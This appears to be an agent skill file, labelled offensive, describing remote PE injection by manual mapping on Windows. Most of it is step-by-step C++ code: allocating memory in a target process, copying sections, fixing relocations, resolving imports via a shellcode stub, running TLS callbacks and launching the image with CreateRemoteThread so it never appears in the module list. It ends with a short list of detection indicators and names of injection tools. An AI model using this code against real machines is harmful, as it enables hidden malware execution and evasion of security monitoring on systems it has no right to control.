---
name: pe-injection-remote
description: Remote PE injection -- write a full PE image into a target process and execute it without LoadLibrary. Manual mapping with relocation processing, import resolution, and TLS callback handling.
metadata:
  type: offensive
---

# Remote PE Injection (Manual Mapping)

Inject a full PE image into a remote process by manually mapping it: allocate memory, copy
sections, process relocations, resolve imports, handle TLS callbacks, and transfer execution
-- all without calling `LoadLibrary`. The PE never appears in the module list.

## Standard DLL Injection vs Manual Mapping

| Aspect                     | LoadLibrary injection            | Manual mapping                   |
|----------------------------|----------------------------------|----------------------------------|
| Module list (`LdrpModuleInfo`) | Visible                       | Not listed                       |
| `GetModuleHandle` findable | Yes                              | No                               |
| File required on disk      | Yes                              | No (inject from memory)          |
| Import resolution          | OS loader                        | Attacker code                    |
| Load callbacks (LdrNotify) | Fires                            | Does not fire                    |
| TLS callbacks              | OS handles                       | Must call manually               |
| PatchGuard / KPP           | N/A (user-mode)                  | N/A (user-mode)                  |

## Implementation

### Step 1: Allocate Image Memory

```cpp
HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

// Read raw PE from disk or memory
auto dos = (PIMAGE_DOS_HEADER)rawPE;
auto nt  = (PIMAGE_NT_HEADERS)(rawPE + dos->e_lfanew);

// Allocate at preferred base, or any address
LPVOID remoteBase = VirtualAllocEx(hp, (LPVOID)nt->OptionalHeader.ImageBase,
    nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (!remoteBase)
    remoteBase = VirtualAllocEx(hp, NULL, nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

### Step 2: Copy Headers + Sections

```cpp
// Headers
WriteProcessMemory(hp, remoteBase, rawPE, nt->OptionalHeader.SizeOfHeaders, NULL);

// Sections
auto sec = IMAGE_FIRST_SECTION(nt);
for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
    if (sec[i].SizeOfRawData == 0) continue;
    WriteProcessMemory(hp,
        (LPBYTE)remoteBase + sec[i].VirtualAddress,
        rawPE + sec[i].PointerToRawData,
        sec[i].SizeOfRawData, NULL);
}
```

### Step 3: Process Relocations

If the image loaded at a different base than `ImageBase`, fix all relocations:

```cpp
ULONG_PTR delta = (ULONG_PTR)remoteBase - nt->OptionalHeader.ImageBase;
if (delta != 0) {
    auto reloc = (PIMAGE_BASE_RELOCATION)(
        (ULONG_PTR)localCopy + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    
    while (reloc->VirtualAddress) {
        DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)(reloc + 1);
        
        for (DWORD i = 0; i < count; ++i) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0xFFF;
            ULONG_PTR* patch = (ULONG_PTR*)(
                (ULONG_PTR)localCopy + reloc->VirtualAddress + offset);
            
            if (type == IMAGE_REL_BASED_DIR64)        // x64: 8-byte fixup
                *patch += delta;
            else if (type == IMAGE_REL_BASED_HIGHLOW)  // x86: 4-byte fixup
                *(DWORD*)patch += (DWORD)delta;
        }
        reloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)reloc + reloc->SizeOfBlock);
    }
    
    // Write relocated image back
    WriteProcessMemory(hp, remoteBase, localCopy, nt->OptionalHeader.SizeOfImage, NULL);
}
```

### Step 4: Resolve Imports (via Shellcode Stub)

Imports must be resolved inside the target process (module base addresses differ per process).
Write a shellcode stub that:

```cpp
// Stub pseudocode (runs in target process):
void resolve_imports(LPBYTE base) {
    auto nt = get_nt_headers(base);
    auto importDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    auto desc = (PIMAGE_IMPORT_DESCRIPTOR)(base + importDir->VirtualAddress);
    
    while (desc->Name) {
        HMODULE mod = LoadLibraryA((LPCSTR)(base + desc->Name));
        auto oft = (PIMAGE_THUNK_DATA)(base + desc->OriginalFirstThunk);
        auto ft  = (PIMAGE_THUNK_DATA)(base + desc->FirstThunk);
        
        while (oft->u1.AddressOfData) {
            if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
                ft->u1.Function = (ULONG_PTR)GetProcAddress(mod,
                    MAKEINTRESOURCEA(IMAGE_ORDINAL(oft->u1.Ordinal)));
            } else {
                auto hint = (PIMAGE_IMPORT_BY_NAME)(base + oft->u1.AddressOfData);
                ft->u1.Function = (ULONG_PTR)GetProcAddress(mod, hint->Name);
            }
            ++oft; ++ft;
        }
        desc++;
    }
}
```

### Step 5: Handle TLS Callbacks

```cpp
auto tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
if (tlsDir->Size) {
    auto tls = (PIMAGE_TLS_DIRECTORY)(base + tlsDir->VirtualAddress);
    auto callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    if (callbacks) {
        while (*callbacks) {
            (*callbacks)((PVOID)base, DLL_PROCESS_ATTACH, NULL);
            callbacks++;
        }
    }
}
```

### Step 6: Call Entry Point

```cpp
auto DllMain = (DllMain_t)(remoteBase + nt->OptionalHeader.AddressOfEntryPoint);
// Execute via CreateRemoteThread, APC, or thread pool callback
CreateRemoteThread(hp, NULL, 0, (LPTHREAD_START_ROUTINE)DllMain, remoteBase, 0, NULL);
```

## Section Protection Hardening

After mapping, set proper page protections per section:

```cpp
DWORD section_protect(DWORD characteristics) {
    bool exec  = characteristics & IMAGE_SCN_MEM_EXECUTE;
    bool read  = characteristics & IMAGE_SCN_MEM_READ;
    bool write = characteristics & IMAGE_SCN_MEM_WRITE;
    
    if (exec && write) return PAGE_EXECUTE_READWRITE;  // avoid if possible
    if (exec && read)  return PAGE_EXECUTE_READ;
    if (exec)          return PAGE_EXECUTE;
    if (write)         return PAGE_READWRITE;
    if (read)          return PAGE_READONLY;
    return PAGE_NOACCESS;
}
```

## Detection

- `MEM_PRIVATE` regions containing PE headers (`MZ` + `PE\0\0` signature) -- the #1 indicator
- Multiple `VirtualAllocEx` + `WriteProcessMemory` calls targeting the same remote region
- Thread start address in an unbacked (non-module) memory region
- Cross-process `WriteProcessMemory` writing > 4KB (section-sized) blocks
- Missing `LdrLoadDll` / `ImageLoaded` events for a DLL that is clearly executing
- PE section names (`.text`, `.rdata`, `.data`) found in `MEM_PRIVATE` regions

## Tools

- **Blackbone** -- comprehensive manual mapping library (supports x86/x64, WoW64 cross-arch)
- **KDMapper** -- kernel-level manual mapper using vulnerable driver
- **xigmapper** -- hypervisor-assisted mapping
- **Donut** -- converts PE to position-independent shellcode (similar end result)

## Related Skills

- `reflective-dll-injection` -- the DLL maps itself (no external mapper needed)
- `early-bird-apc-ppid-spoof` -- alternative execution trigger after mapping
- `windows-process-injection-memory` -- umbrella injection reference
